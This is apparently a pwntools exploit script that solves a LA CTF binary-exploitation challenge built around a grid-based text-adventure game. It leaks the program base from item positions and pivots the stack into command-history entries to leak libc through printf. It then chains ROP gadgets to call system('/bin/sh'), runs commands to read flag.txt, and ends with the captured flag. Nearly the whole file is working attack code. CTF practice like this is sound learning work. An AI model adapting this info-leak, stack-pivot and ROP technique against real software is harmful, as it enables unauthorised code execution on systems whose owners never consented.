#!/usr/bin/env python3

from pwn import *
import re

exe = context.binary = ELF(args.EXE or '', checksec=True)
# libc = exe.libc
context.terminal = ["tmux", "splitw", "-h"]
# context.encoding = 'utf-8'

gdbscript = '''
b *check_flag_password+171
continue
'''

pre_argv = []
post_argv = []

def get_conn(pre_argv=[], post_argv=[], gdbscript="", *a, **kw):
    host = args.HOST or ''
    port = int(args.PORT or 0)
    gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
    exe_name = os.path.basename(exe.path)
    cmd = pre_argv + [exe.path] + post_argv

    if args.DOCKER:
        if args.REMOTE:
            p = remote(host, port, *a, **kw)
        else:
            p = process(f'docker run -i --rm {args.DOCKER}', shell=True)
        if args.GDB:
            sleep(1) # TODO: find better method
            gdb.attach(pidof(exe_name)[0], gdbscript=gdbscript, exe=exe.path, *a, **kw)
        return p
    if args.GDB:
        return gdb.debug(cmd, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(host, port, *a, **kw)

    return process(cmd, *a, **kw)

io = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
rotate_left = lambda x, a, s=64: (x << a) | (x >> (s-a))
rotate_right = lambda x, a, s=64: (x >> a) | (x << (s-a))
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
ptr_mangle = lambda addr, cookie=0: rotate_left(addr ^ cookie, 17)
ptr_demangle = lambda addr, cookie=0: rotate_right(addr, 17) ^ cookie
logleak = lambda **k: [success(f"{k}: {v:#x}") for k, v in k.items()]
has_space       = lambda data: any(c in {0x20, 0x09, 0x0a, 0x0b, 0x0c, 0x0d} for c in data)
is_scanf_safe   = lambda data: not has_space(data)
is_stream_safe  = lambda data: not has_space(data)
is_cin_safe     = lambda data: not has_space(data)
is_fgets_safe   = lambda data: (b'\n' not in data)
is_gets_safe    = lambda data: is_fgets_safe(data)
is_getline_safe = lambda data: is_fgets_safe(data)


def trace(func):
    def wrapper(*args, **kwargs):
        info(f"{func.__name__} {args} {kwargs}")
        return func(*args, **kwargs)
    return wrapper

ITEM_NAMES = [
    "Sword","Shield","Potion","Key","Scroll","Amulet","Crown","Flag"
]

BOARD_SIZE=16

# @trace
def send_cmd(cmd):
    sla(b"> ", cmd.encode())

def send_cmdb(cmd):
    sla(b"> ", cmd)


def parse_item(look_out: bytes):
    m = re.search(rb"spot a ([A-Za-z]+)", look_out)
    if not m:
        m = re.search(rb"A glimmering ([A-Za-z]+) lies at your feet!", look_out)
        if not m:
            return None
    name = m.group(1).decode()
    return ITEM_NAMES.index(name)

def leak_main_addr():
    coords = {}
    send_cmd("look")
    out = ru(b"\n\n", drop=False)
    idx = parse_item(out)
    print(out)
    if idx is not None:
        coords[(0, 0)] = idx

    sequence = []
    px,py = 0,0
    x_dir = 'e'
    y_dir = 's'
    for y in range(BOARD_SIZE):
        for x in range(BOARD_SIZE-1):
            if x != BOARD_SIZE-1:
                px += 1 if x_dir == 'e' else -1
            sequence.append(((px, py), x_dir))

        if y != BOARD_SIZE-1:
            py += 1 if y_dir == 's' else -1
            sequence.append(((px, py), y_dir))
            
        x_dir = 'e' if x_dir == 'w' else 'w'

    for (px ,py), d in sequence:
        send_cmd(d)
        out = ru(b'> ')
        print(px, py, out)
        io.unrecv(b'> ')
        idx = parse_item(out)
        if idx is not None:
            coords[(px, py)] = idx

    print(coords)

    # coords: (x,y) -> idx
    inv = {idx: (x, y) for (x, y), idx in coords.items()}
    if len(inv) != 8:
        raise ValueError(f"missing items: have {len(inv)}")

    addr = 0
    for i in range(6):  # item index == byte index
        x, y = inv[i]
        b = ((x & 0xF) << 4) | (y & 0xF)
        addr |= (b & 0xFF) << (8 * i)
    return addr, inv[7]

addr, flag_pos = leak_main_addr()
logleak(main=addr)
info(f"flag is at {flag_pos}")
exe.address = addr - exe.sym.main
info(f"exe base: {exe.address:#x}")

# go back to 0,0
for _ in range(BOARD_SIZE-1):
    send_cmd('n')


# add entries to history, to setup new stack

send_cmdb(p64(exe.address + 0x4020 + 0x10 + 0x8f8).strip(b'\x00'))
send_cmdb(p64(exe.address + 0x1470).strip(b'\x00'))
send_cmdb(p64(exe.got.puts).strip(b'\x00'))
send_cmdb(p64(exe.sym.main).strip(b'\x00'))

send_cmd("grab")

s(flat(
    b'A' * 0x8,
    b'B' * 0x8,
    exe.address + 0x4020 + 0x10 + 0x8e8, # new stack
    exe.address + 0x1470, # printf, to leak 4B of libc
)[:0x20-1])

ru('  ║  '.encode())
ru('  ║  '.encode())
ru('  ║  '.encode())
ru('  ║  '.encode())
ru('  ║  '.encode())
leak = rl().strip()
print(leak)
toks = leak.split(b'/')
print(toks)
tok = toks[2].split(b' ')[1]
print(tok)

libc_leak = u64(tok.ljust(8, b'\x00'))
logleak(libc_leak=libc_leak)
# libc = exe.libc
# print(libc)
libc = ELF("./libc.so.6")
libc.address = libc_leak - 0x087be0
logleak(libc_base=libc.address)

ogs = "361445 361452 361459 361466 361471 361479 361486 361490 361495 361500 361505 980174 980267 1118682 1118690 1118695 1118705"
ogs = list(map(int, ogs.split()))
og = libc.address + ogs[int(args.X or "0")]
libc_main = libc.address + 0x2A390 # just to verify
libc_bss = libc.address + 0x210000

# 0x0012e01b: add rsp, 0x40; ret;
rop = ROP(libc)
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
RET = POP_RDI + 1
BIN_SH = next(libc.search(b'/bin/sh\x00'))

send_cmdb(p64(RET).strip(b'\x00'))
send_cmdb(p64(RET).strip(b'\x00'))
send_cmdb(p64(POP_RDI).strip(b'\x00'))
send_cmdb(p64(BIN_SH).strip(b'\x00'))
send_cmdb(p64(libc.sym.system).strip(b'\x00'))
send_cmdb(p64(0).strip(b'\x00'))
send_cmdb(p64(libc.sym.exit).strip(b'\x00'))

send_cmd("grab")

s(flat(
    b'A' * 0x8,
    b'B' * 0x8,
    exe.address + 0x4020 + 0x10 + 0x8e8 + 0x20, # new stack
    libc.address + 0x0012e01b,
)[:0x20-1])

sleep(1)
sl(b'ls')
sl(b'cat flag.txt')

ia()

# lactf{Th3_835T_345T3r_399_i5_4_fl49}
